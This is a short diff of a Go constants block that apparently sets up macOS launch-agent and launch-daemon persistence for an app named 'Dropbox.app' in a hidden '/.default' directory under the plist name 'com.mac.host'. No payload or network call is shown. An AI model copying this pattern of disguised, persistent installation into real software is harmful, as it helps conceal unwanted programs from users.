@@ -10,6 +10,7 @@ const(
   TargetDir       string  = "/.default"
   TargetName      string  = "Dropbox.app"
   PlistDir        string  = "/Library/LaunchAgents"
+  RPlistDir       string  = "/Library/LaunchDaemons"
   PlistName       string  = "com.mac.host"
 )
 
